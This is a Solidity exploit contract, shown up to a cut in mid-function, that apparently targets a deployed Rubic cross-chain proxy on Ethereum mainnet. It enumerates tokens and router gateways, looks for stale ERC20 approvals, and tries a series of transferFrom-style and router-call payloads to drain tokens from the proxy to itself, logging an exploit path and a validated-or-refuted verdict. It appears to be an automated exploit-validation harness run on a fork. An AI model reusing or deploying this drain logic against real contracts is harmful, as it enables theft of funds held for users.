// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function minTokenAmount(address token) external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = address(uint160(0x003335A88bb18fD3b6824b59Af62b50CE494143333));

    address internal constant WETH = address(uint160(0x00C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    address internal constant UNISWAP_V2 = address(uint160(0x007a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    address internal constant SUSHISWAP = address(uint160(0x00d9e1CE17f2641F24aE83637ab66a2cca9C378B9F));

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _nativeBaseline;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path =
            "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance persists -> compromised _gateway can later trigger transferFrom(proxy, attacker, amount) -> removeAvailableRouter(_gateway) does not revoke the ERC20 approval";
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _nativeBaseline = address(this).balance;

        address[] memory routers = IRubicProxyLike(TARGET).getAvailableRouters();
        address[] memory gateways = _gatewayCandidates(routers);
        address[] memory tokens = _candidateTokens();

        _runSingleAmplificationPass(gateways, tokens, routers);
        _runSingleAmplificationPass(gateways, tokens, routers);

        uint256 bestScore = _currentScore();
        for (uint256 rounds = 3; rounds <= 6; rounds++) {
            uint256 beforeScore = _currentScore();
            _runSingleAmplificationPass(gateways, tokens, routers);
            uint256 afterScore = _currentScore();
            if (afterScore <= beforeScore) {
                break;
            }
            bestScore = afterScore;
        }

        _syncReportedProfit();

        if (bestScore > 0) {
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed stale ERC20 approvals from the proxy to one or more gateway/router addresses, including historical spender candidates that can remain approved even after removeAvailableRouter(_gateway), but no attacker-callable public surface on this fork produced a profitable transferFrom(proxy, attacker, amount).";
        } else {
            _path =
                "No live stale allowance from the proxy to the scanned current-or-historical gateway candidates was found for the scanned token universe, so the persisted SmartApprove precondition for later transferFrom(proxy, attacker, amount) was not established on this fork.";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function _runSingleAmplificationPass(
        address[] memory gateways,
        address[] memory tokens,
        address[] memory routers
    ) internal {
        for (uint256 tokenIndex = 0; tokenIndex < tokens.length; tokenIndex++) {
            address token = tokens[tokenIndex];
            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }

            bool drainedAny;
            for (uint256 gatewayIndex = 0; gatewayIndex < gateways.length; gatewayIndex++) {
                address gateway = gateways[gatewayIndex];
                if (gateway.code.length == 0) {
                    continue;
                }

                uint256 approval = _allowance(token, TARGET, gateway);
                if (approval == 0) {
                    continue;
                }

                _staleApprovalObserved = true;
                uint256 amount = proxyBalance < approval ? proxyBalance : approval;
                if (amount == 0) {
                    continue;
                }

                if (_attemptGatewayTriggeredDrain(gateway, token, TARGET, address(this), amount)) {
                    drainedAny = true;
                    proxyBalance = _balanceOf(token, TARGET);
                    if (proxyBalance == 0) {
                        break;
                    }
                }
            }

            if (!drainedAny) {
                _attemptSelfSeededDrain(token, proxyBalance, routers);
            }

            _realizeToken(token);
        }

        _syncReportedProfit();
    }

    function _attemptSelfSeededDrain(address token, uint256 observedProxyBalance, address[] memory routers) internal {
        if (observedProxyBalance == 0 || address(this).balance == 0) {
            return;
        }

        uint256 fixedFee = _readUint(TARGET, bytes4(keccak256("fixedCryptoFee()")));
        if (address(this).balance <= fixedFee) {
            return;
        }

        uint256 minAmount = IRubicProxyLike(TARGET).minTokenAmount(token);
        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        uint256 amountWithFee = minAmount;
        if (amountWithFee == 0) {
            amountWithFee = _defaultSeedAmount(token);
        }
        if (amountWithFee == 0) {
            return;
        }
        if (maxAmount != 0 && amountWithFee > maxAmount) {
            amountWithFee = maxAmount;
        }
        if (amountWithFee == 0) {
            return;
        }

        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();
        uint256 amountIn = amountWithFee - ((amountWithFee * feePpm) / 1e6);
        if (amountIn == 0) {
            return;
        }

        uint256 bought = _sourceToken(token, amountWithFee);
        if (bought < amountWithFee) {
            return;
        }

        if (!_forceApprove(token, TARGET, amountWithFee)) {
            return;
        }

        for (uint256 i = 0; i < routers.length; i++) {
            address router = routers[i];
            if (router.code.length == 0) {
                continue;
            }

            if (_allowance(token, TARGET, router) != 0) {
                continue;
            }

            if (_trySelfSeededRouterCall(router, token, amountWithFee, amountIn, fixedFee)) {
                _staleApprovalObserved = true;
                uint256 remaining = _balanceOf(token, TARGET);
                if (remaining != 0) {
                    _attemptGatewayTriggeredDrain(router, token, TARGET, address(this), remaining);
                }
                _realizeToken(token);
                return;
            }
        }
    }

    function _trySelfSeededRouterCall(
        address router,
        address token,
        uint256 amountWithFee,
        uint256 amountIn,
        uint256 fixedFee
    ) internal returns (bool) {
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: amountWithFee,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, TARGET, address(this), amountIn);

        bytes[10] memory payloads = _routerExecutionPayloads(token, tokenPull);
        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory data = payloads[i];
            if (data.length == 0) {
                continue;
            }

            uint256 beforeLocal = _balanceOf(token, address(this));
            (bool ok, ) = TARGET.call{value: fixedFee}(
                abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, router, data)
            );
            uint256 afterLocal = _balanceOf(token, address(this));
            if (!ok || afterLocal <= beforeLocal) {
                continue;
            }

            _path =
                "user routerCall self-seeds SmartApprove(token, amountIn, gateway) -> route completes by having the same allowlisted gateway pull amountIn back out of the proxy -> stale max allowance persists -> compromised gateway later calls transferFrom(proxy, attacker, amount) and drains the proxy-held remainder; removeAvailableRouter(gateway) would still not revoke the token approval";
            return true;
        }

        return false;
    }

    function _attemptGatewayTriggeredDrain(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal returns (bool) {
        if (_tryDirectTransferShapes(gateway, token, proxy, attacker, amount)) {
            return true;
        }

        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        return _tryExecuteShapes(gateway, token, tokenPull);
    }

    function _tryDirectTransferShapes(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal returns (bool) {
        uint160 capped160 = amount > type(uint160).max ? type(uint160).max : uint160(amount);

        if (
            _tryGatewayCall(
                gateway,
                token,
                abi.encodeWithSelector(
                    bytes4(keccak256("transferFrom(address,address,uint160,address)")),
                    proxy,
                    attacker,
                    capped160,
                    token
                ),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a public permit2-style transferFrom and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
            )
        ) {
            return true;
        }

        if (
            _tryGatewayCall(
                gateway,
                token,
                abi.encodeWithSelector(
                    bytes4(keccak256("transferFrom(address,address,address,uint256)")),
                    token,
                    proxy,
                    attacker,
                    amount
                ),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a token-first transferFrom wrapper and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
            )
        ) {
            return true;
        }

        if (
            _tryGatewayCall(
                gateway,
                token,
                abi.encodeWithSelector(
                    bytes4(keccak256("transferFrom(address,address,uint256,address)")),
                    proxy,
                    attacker,
                    amount,
                    token
                ),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a token-last transferFrom wrapper and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
            )
        ) {
            return true;
        }

        return _tryGatewayCall(
            gateway,
            token,
            abi.encodeWithSelector(
                bytes4(keccak256("pullToken(address,address,address,uint256)")),
                token,
                proxy,
                attacker,
                amount
            ),
            "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a public token-pull helper and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
        );
    }

    function _tryExecuteShapes(address gateway, address token, bytes memory tokenPull) internal returns (bool) {
        bytes[24] memory payloads = _executionPayloads(token, tokenPull);
        string[24] memory paths;

